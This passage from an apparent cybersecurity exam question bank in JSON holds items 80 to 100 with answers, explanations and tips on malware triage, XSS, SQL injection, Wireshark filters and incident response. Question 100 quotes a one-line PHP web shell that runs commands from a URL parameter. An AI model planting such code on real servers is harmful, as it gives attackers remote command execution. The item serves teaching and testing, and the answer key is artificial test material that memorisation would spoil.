      "explanation": "A WAF does not encrypt all traffic (that might be TLS/SSL), create VPNs, or handle user accounts. A WAF inspects and filters HTTP(S) traffic specifically for threats like SQL injection, cross-site scripting, and other web exploits, acting like a shield for the web application layer.",
      "examTip": "A WAF is a specialized firewall designed specifically to protect web applications from attacks."
    },
    {
      "id": 80,
      "question": "A user reports that their computer is running extremely slowly, and they are experiencing frequent system crashes. They also mention that they recently downloaded and installed a \"free\" game from a website they had never visited before. What is the MOST likely cause of these issues, and what is the BEST course of action?",
      "options": [
        "The computer's hard drive is failing; the user should replace the hard drive immediately.",
        "The computer is likely infected with malware; the user should disconnect from the network, run a full system scan with reputable anti-malware software, and consider restoring from a recent backup if necessary.",
        "The computer's operating system is outdated and needs to be updated.",
        "The user's internet service provider (ISP) is experiencing technical difficulties."
      ],
      "correctAnswerIndex": 1,
      "explanation": "A failing hard drive can cause crashes, but the suspicious download from an unknown site strongly suggests malware. Slowness, crashes, and recent untrusted software installation are classic signs of infection. Immediate action: take the system offline, perform malware scans, and if necessary, restore from clean backups.",
      "examTip": "Downloading software from untrusted sources is a major risk factor for malware infections."
    },
    {
      "id": 81,
      "question": "Which of the following Linux commands is MOST useful for listing all open files on a system, including network connections, and filtering the output to show only those associated with a specific process ID (PID)?",
      "options": [
        "netstat -an",
        "lsof -p <PID>",
        "ps aux",
        "top"
      ],
      "correctAnswerIndex": 1,
      "explanation": "netstat -an displays network connections only. ps aux shows running processes but not their open files. top shows real-time resource usage. lsof -p <PID> lists all open files (including sockets) for a particular process, which is ideal for tracking an individual PID's file handles or network connections.",
      "examTip": "lsof -p <PID> shows all open files (including network connections) for a specific process on Linux."
    },
    {
      "id": 82,
      "question": "What is the primary security purpose of enabling and reviewing 'audit logs' on systems and applications?",
      "options": [
        "To encrypt sensitive data stored on the system.",
        "To record a chronological sequence of activities, providing evidence for security investigations, compliance audits, and troubleshooting.",
        "To automatically back up critical system files and configurations.",
        "To prevent users from accessing sensitive data without authorization."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Audit logs do not directly encrypt or back up data, nor do they themselves prevent unauthorized access. They chronologically record system events, logins, changes, etc., which is critical for investigating incidents, demonstrating compliance, and diagnosing system issues.",
      "examTip": "Audit logs provide a crucial record of system and user activity for security and compliance purposes."
    },
    {
      "id": 83,
      "question": "You are analyzing a potential cross-site scripting (XSS) vulnerability in a web application. Which of the following characters, if present in user input and not properly handled by the application, would be MOST concerning?",
      "options": [
        "Periods (.) and commas (,)",
        "Angle brackets (< and >), double quotes (\"), single quotes ('), and ampersands (&)",
        "Dollar signs ($) and percent signs (%)",
        "Underscores (_) and hyphens (-)"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Periods, commas, dollar signs, percent signs, underscores, and hyphens are typically less dangerous. Angle brackets (<, >), quotes, and ampersands (&) are critical in HTML/JavaScript context and can lead to code execution if not sanitized or escaped, making them prime suspects for XSS.",
      "examTip": "Angle brackets, quotes, and ampersands are key characters to watch for in XSS attacks."
    },
    {
      "id": 84,
      "question": "A user receives an email claiming to be from a technical support company, stating that their computer is infected with a virus and they need to call a phone number immediately for assistance. The user has never contacted this company before. What type of attack is MOST likely being attempted, and what should the user do?",
      "options": [
        "A legitimate technical support notification; the user should call the phone number provided.",
        "A technical support scam; the user should delete the email, not call the number, and run a scan with their antivirus software.",
        "A denial-of-service (DoS) attack; the user should forward the email to their IT department.",
        "A cross-site scripting (XSS) attack; the user should reply to the email and ask for clarification."
      ],
      "correctAnswerIndex": 1,
      "explanation": "This is a classic tech support scam. Legitimate support companies generally don’t initiate contact claiming infection. The user should not call the number, should delete the email, and scan their computer. Such scams aim to trick users into handing over money or control of their system.",
      "examTip": "Be very wary of unsolicited technical support offers, especially those involving phone calls or remote access."
    },
    {
      "id": 85,
      "question": "What is the primary security function of 'Network Access Control (NAC)'?",
      "options": [
        "To encrypt all data transmitted across a network.",
        "To control access to a network by enforcing policies on devices connecting to it, verifying their security posture before granting access.",
        "To automatically back up all data on network-connected devices.",
        "To prevent users from accessing specific websites or applications."
      ],
      "correctAnswerIndex": 1,
      "explanation": "NAC does not inherently encrypt all data, back it up, or block certain websites. NAC ensures that any device connecting to the network meets certain requirements (patched OS, enabled antivirus, etc.) before being granted access, thus reducing the risk of compromised or infected endpoints.",
      "examTip": "NAC enforces security policies and verifies device posture before granting network access."
    },
    {
      "id": 86,
      "question": "A security analyst discovers a file named svchost.exe in an unusual location on a Windows system (e.g., C:\\Users\\<username>\\Downloads). What is the significance of this finding, and what further steps should be taken?",
      "options": [
        "The file is likely a legitimate Windows system file; no further action is needed.",
        "The file is likely a malicious executable masquerading as a legitimate system process; further investigation is required, including checking the file's hash, digital signature, and analyzing it in a sandbox.",
        "The file should be immediately deleted to prevent further infection.",
        "The system should be immediately shut down to prevent the spread of malware."
      ],
      "correctAnswerIndex": 1,
      "explanation": "A legitimate svchost.exe resides in C:\\Windows\\System32 (or SysWOW64). Finding it elsewhere is suspicious. Immediate deletion might destroy evidence; shutting down loses volatile data. Proper steps include investigating its hash (via VirusTotal), checking its signature, sandbox analysis, and broader forensic steps to see if it’s part of an infection.",
      "examTip": "The location of svchost.exe is crucial; outside of System32, it's highly suspicious."
    },
    {
      "id": 87,
      "question": "What is 'data exfiltration'?",
      "options": [
        "The process of backing up data to a secure, offsite location.",
        "The unauthorized transfer of data from within an organization's control to an external location, typically controlled by an attacker.",
        "The process of encrypting sensitive data at rest to protect it from unauthorized access.",
        "The process of securely deleting data from storage media so that it cannot be recovered."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Data exfiltration is not backup, encryption, or secure deletion. It is the unauthorized copying or transfer of sensitive data from an organization to a location controlled by an attacker, often a key objective in breaches.",
      "examTip": "Data exfiltration is the unauthorized removal of data from an organization's systems."
    },
    {
      "id": 88,
      "question": "Which of the following is the MOST effective way to prevent 'SQL injection' attacks?",
      "options": [
        "Using strong, unique passwords for all database user accounts.",
        "Using parameterized queries (prepared statements) with strict type checking, combined with robust input validation and output encoding where applicable.",
        "Encrypting all data stored in the database at rest.",
        "Conducting regular penetration testing exercises."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Strong passwords help secure database accounts, but don’t prevent injection. Encryption at rest protects data if stolen, but not from injection. Pentesting finds issues but doesn’t fix them. Parameterized queries with proper validation and escaping remain the best defense against SQL injection.",
      "examTip": "Parameterized queries, type checking, and input validation are essential for preventing SQL injection."
    },
    {
      "id": 89,
      "question": "You are analyzing network traffic using Wireshark. You want to filter the display to show only HTTP GET requests. Which of the following display filters is MOST appropriate?",
      "options": [
        "http.request",
        "http.request.method == GET",
        "tcp.port == 80",
        "http"
      ],
      "correctAnswerIndex": 1,
      "explanation": "http.request shows all HTTP requests (GET, POST, PUT, etc.). tcp.port == 80 shows all traffic on port 80, not just GET requests. http shows all HTTP traffic (requests and responses). http.request.method == GET is the specific filter to see only GET requests.",
      "examTip": "Use http.request.method == \"GET\" in Wireshark to filter for HTTP GET requests."
    },
    {
      "id": 90,
      "question": "A user reports their computer is behaving erratically, displaying numerous pop-up windows, and redirecting their web browser to unfamiliar websites. What is the MOST likely cause, and what is the BEST initial course of action?",
      "options": [
        "The computer's hard drive is failing; the user should back up their data and replace the hard drive.",
        "The computer is likely infected with adware or a browser hijacker; the user should disconnect from the network, run a full scan with reputable anti-malware software, and use specialized adware/browser hijacker removal tools.",
        "The computer's operating system is outdated and needs to be updated.",
        "The user's internet service provider (ISP) is experiencing technical difficulties."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Pop-up ads and redirects strongly indicate adware or a browser hijacker. Disconnecting from the network prevents further communication with malicious sites or servers. Then a thorough malware scan (potentially in safe mode) and specialized removal tools are recommended. OS updates alone won’t remove the malware.",
      "examTip": "Pop-up ads and browser redirects are strong indicators of adware or browser hijacker infections."
    },
    {
      "id": 91,
      "question": "A security analyst discovers a file on a web server with a .php extension in a directory that should only contain image files. Furthermore, the file's name is x.php. What is the MOST likely implication of this finding, and what immediate actions should be taken?",
      "options": [
        "The file is likely a legitimate PHP script used by the web application; no action is needed.",
        "The file is likely a web shell uploaded by an attacker; the server should be isolated, the file's contents and creation time investigated, and a full security audit conducted.",
        "The file is likely a corrupted image file; it should be deleted.",
        "The file is likely a backup of the web server's configuration; it should be moved to a secure location."
      ],
      "correctAnswerIndex": 1,
      "explanation": "A .php file named x.php in an images directory is almost certainly malicious. This is a classic example of a web shell that allows remote command execution. The analyst should isolate the server, examine the file, and thoroughly investigate logs and other evidence to determine how it was uploaded and what it did.",
      "examTip": "Unexpected PHP files (especially with generic names) in unusual locations on a web server are strong indicators of web shells."
    },
    {
      "id": 92,
      "question": "What is the primary purpose of 'vulnerability scanning'?",
      "options": [
        "To exploit identified vulnerabilities and gain unauthorized access to systems.",
        "To identify, classify, prioritize, and report on security weaknesses in systems, networks, and applications.",
        "To automatically fix all identified vulnerabilities and misconfigurations.",
        "To simulate real-world attacks against an organization's defenses."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Vulnerability scanning is not the same as exploiting (penetration testing), automatically fixing issues, or simulating real attacks. It uses automated tools to detect potential weaknesses and configurations, then ranks them for further action. This helps inform remediation efforts.",
      "examTip": "Vulnerability scanning identifies and prioritizes potential security weaknesses, but doesn't exploit them."
    },
    {
      "id": 93,
      "question": "You are analyzing network traffic using Wireshark and want to filter the display to show only traffic to or from a specific IP address (e.g., 192.168.1.100) and on a specific port (e.g., 80). Which Wireshark display filter is MOST appropriate?",
      "options": [
        "tcp.port == 80",
        "ip.addr == 192.168.1.100 && tcp.port == 80",
        "http",
        "ip.addr == 192.168.1.100"
      ],
      "correctAnswerIndex": 1,
      "explanation": "tcp.port == 80 shows all traffic on port 80, regardless of IP. http shows all HTTP traffic on any port. ip.addr == 192.168.1.100 shows all traffic to/from that IP, regardless of port. The combination filter ip.addr == 192.168.1.100 && tcp.port == 80 shows only traffic matching both conditions.",
      "examTip": "Use && in Wireshark display filters to combine multiple conditions (AND logic)."
    },
    {
      "id": 94,
      "question": "Which of the following is the MOST effective method for preventing 'cross-site scripting (XSS)' attacks in web applications?",
      "options": [
        "Using strong, unique passwords for all user accounts.",
        "Implementing rigorous input validation and context-aware output encoding (or escaping).",
        "Encrypting all network traffic using HTTPS.",
        "Conducting regular penetration testing exercises."
      ],
      "correctAnswerIndex": 1,
      "explanation": "While strong passwords, HTTPS, and penetration testing are all beneficial, they do not directly prevent XSS. The key is to validate user input and perform context-aware encoding before displaying any user-supplied data, ensuring the browser treats it as text rather than executable code.",
      "examTip": "Input validation and context-aware output encoding are the primary defenses against XSS."
    },
    {
      "id": 95,
      "question": "What is the primary purpose of 'data loss prevention (DLP)' systems?",
      "options": [
        "To encrypt all data stored on an organization's servers and workstations.",
        "To prevent sensitive data from leaving the organization's control without authorization.",
        "To automatically back up all critical data to a secure, offsite location.",
        "To detect and remove all malware and viruses from a company's network."
      ],
      "correctAnswerIndex": 1,
      "explanation": "DLP may use encryption, but that is not its main function. It’s not for backups or malware removal. DLP monitors data in motion, in use, and at rest to detect and prevent unauthorized or accidental transmission of sensitive information outside the organization.",
      "examTip": "DLP systems focus on preventing sensitive data from leaving the organization's control."
    },
    {
      "id": 96,
      "question": "A security analyst notices unusual activity on a critical server. Which of the following actions should be taken as part of the 'containment' phase of incident response?",
      "options": [
        "Identifying the root cause of the incident.",
        "Isolating the affected server from the network to prevent further spread or damage.",
        "Restoring the server to its normal operational state from a backup.",
        "Eradicating the threat by removing malware and patching vulnerabilities."
      ],
      "correctAnswerIndex": 1,
      "explanation": "During containment, the first priority is to limit damage. Isolate the affected system so the threat can’t spread. Identifying root cause, restoring, and eradicating come after or alongside containment but are not the immediate step of that phase.",
      "examTip": "Containment focuses on limiting the spread and impact of an incident."
    },
    {
      "id": 97,
      "question": "What is 'threat modeling'?",
      "options": [
        "Creating a three-dimensional model of a network's physical layout.",
        "A structured process, ideally performed during the design phase of a system or application, to identify, analyze, prioritize, and mitigate potential threats, vulnerabilities, and attack vectors.",
        "Simulating real-world attacks against a live production system to test its defenses.",
        "Developing new security software and hardware solutions."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Threat modeling is not physical modeling, real-world attack simulation (that's red teaming), or product development. It’s a proactive technique to consider threats, vulnerabilities, and mitigations early in the design. This helps build security in from the start.",
      "examTip": "Threat modeling is a proactive approach to building secure systems by identifying and addressing potential threats early on."
    },
    {
      "id": 98,
      "question": "Which of the following Linux commands is MOST useful for displaying the listening network ports on a system, along with the associated process IDs (PIDs) and program names?",
      "options": [
        "ps aux",
        "netstat -tulnp (or ss -tulnp)",
        "top",
        "lsof -i"
      ],
      "correctAnswerIndex": 1,
      "explanation": "ps aux lists processes but not their listening ports. top shows resource usage. lsof -i lists open files/sockets but is less specifically focused on listening ports. netstat -tulnp (or ss -tulpn) is specifically for showing TCP/UDP listening ports, process IDs, and program names. -t: TCP, -u: UDP, -l: listening, -n: numeric addresses, -p: PID/program.",
      "examTip": "netstat -tulnp (or ss -tulpn) is the preferred command for viewing listening ports and associated processes on Linux."
    },
    {
      "id": 99,
      "question": "You are investigating a suspected compromise on a Windows system. You believe that malware may have modified the system's HOSTS file to redirect legitimate traffic to malicious websites. Where is the HOSTS file typically located on a Windows system?",
      "options": [
        "C:\\Program Files\\hosts",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Users\\%USERNAME%\\Documents\\hosts",
        "C:\\Windows\\hosts"
      ],
      "correctAnswerIndex": 1,
      "explanation": "On modern Windows systems, the HOSTS file is found at C:\\Windows\\System32\\drivers\\etc\\hosts. If malware manipulates it, it can override DNS lookups and redirect traffic to malicious IPs, intercepting or blocking access to legitimate sites.",
      "examTip": "The Windows HOSTS file is located at C:\\Windows\\System32\\drivers\\etc\\hosts and is a common target for malware."
    },
    {
      "id": 100,
      "question": "A web application allows users to upload files. An attacker uploads a file named evil.php containing the following PHP code: <?php system($_GET['cmd']); ?> If the web server is misconfigured and allows the execution of user-uploaded PHP files, what type of vulnerability is this, and what could the attacker achieve?",
      "options": [
        "Cross-site scripting (XSS); the attacker could inject malicious scripts into the website.",
        "Remote Code Execution (RCE); the attacker could execute arbitrary commands on the web server.",
        "SQL injection; the attacker could manipulate database queries.",
        "Denial-of-service (DoS); the attacker could overwhelm the server with requests."
      ],
      "correctAnswerIndex": 1,
      "explanation": "This is not XSS, SQL injection, or a typical DoS. The uploaded PHP code uses system() to run commands specified in the cmd parameter. That’s remote code execution, giving the attacker control over the server with the ability to run arbitrary OS commands.",
      "examTip": "File upload vulnerabilities that allow execution of server-side code (like PHP) lead to Remote Code Execution (RCE)."
    }
  ]
}
